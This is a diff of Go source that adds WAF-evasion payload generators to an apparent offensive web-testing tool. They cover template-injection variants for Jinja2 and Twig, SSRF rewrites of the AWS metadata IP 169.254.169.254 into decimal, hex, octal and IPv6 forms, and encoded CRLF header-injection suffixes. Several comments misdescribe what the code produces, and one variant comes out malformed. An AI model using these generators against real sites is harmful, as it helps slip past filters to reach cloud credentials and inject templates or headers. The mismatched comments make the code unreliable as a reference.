@@ -102,6 +102,92 @@ func XSSBypass(payload string) []string {
 	return variants
 }
 
+// SSTIBypass generates WAF-evading variants of a template injection expression.
+// These exploit differences in how WAFs and template engines parse delimiters.
+func SSTIBypass(expr string) []string {
+	var variants []string
+
+	// URL-encoded delimiters: {{7*7}} → %7B%7B7*7%7D%7D
+	variants = append(variants, urlEncodeBraces(expr))
+
+	// Unicode escapes for Jinja2: {{7*7}} → {%print(7*7)%}
+	if strings.Contains(expr, "{{") {
+		variants = append(variants, strings.Replace(expr, "{{", "{%print(", 1))
+		// Jinja2 alternative syntax: {% set x=7*7 %}{{x}}
+		variants = append(variants, strings.Replace(
+			strings.Replace(expr, "}}", ")%}", 1),
+			"{{", "{%print(", 1))
+	}
+
+	// Comment injection for Twig: {{7{# #}*7}}
+	if strings.Contains(expr, "{{") {
+		inner := strings.TrimPrefix(strings.TrimSuffix(expr, "}}"), "{{")
+		if len(inner) > 2 {
+			mid := len(inner) / 2
+			variants = append(variants, "{{"+inner[:mid]+"{# #}"+inner[mid:]+"}}")
+		}
+	}
+
+	// String concatenation in Jinja2: {{'7'*7}} or {{lipsum.__globals__}}
+	if expr == "{{7*7}}" {
+		variants = append(variants, "{{'7'*7}}")
+		variants = append(variants, "{{7*'7'}}")
+	}
+
+	return variants
+}
+
+// SSRFBypass generates WAF-evading variants of SSRF target URLs.
+// Bypasses common WAF rules that block 169.254.169.254 and other metadata IPs.
+func SSRFBypass(targetURL string) []string {
+	var variants []string
+
+	// IP notation variants for AWS metadata
+	if strings.Contains(targetURL, "169.254.169.254") {
+		// Decimal notation
+		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "2852039166"))
+		// Hex notation
+		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "0xa9fea9fe"))
+		// Octal notation
+		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "0251.0376.0251.0376"))
+		// Mixed notation
+		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "169.254.169.254."))
+		// IPv6 mapped
+		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "[::ffff:a9fe:a9fe]"))
+		// Redirect via URL shortener pattern
+		variants = append(variants, strings.ReplaceAll(targetURL, "http://169.254.169.254", "http://169.254.169.254@127.0.0.1"))
+	}
+
+	// Protocol-level bypasses
+	if strings.HasPrefix(targetURL, "http://") {
+		variants = append(variants, strings.Replace(targetURL, "http://", "http:///", 1))
+	}
+
+	return variants
+}
+
+// CRLFBypass generates WAF-evading variants of CRLF injection suffixes.
+func CRLFBypass(suffix string) []string {
+	var variants []string
+
+	// Double URL encoding
+	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d", "%250d"), "%0a", "%250a"))
+	// Mixed case hex
+	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d", "%0D"), "%0a", "%0A"))
+	// Unicode variants
+	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d%0a", "%E5%98%8A%E5%98%8D"), "%0a", "%E5%98%8A"))
+	// Tab before header name
+	variants = append(variants, strings.ReplaceAll(suffix, "%0d%0a", "%0d%0a%09"))
+
+	return variants
+}
+
+func urlEncodeBraces(s string) string {
+	s = strings.ReplaceAll(s, "{", "%7B")
+	s = strings.ReplaceAll(s, "}", "%7D")
+	return s
+}
+
 // --- Helper functions ---
 
 func randomCase(s string) string {
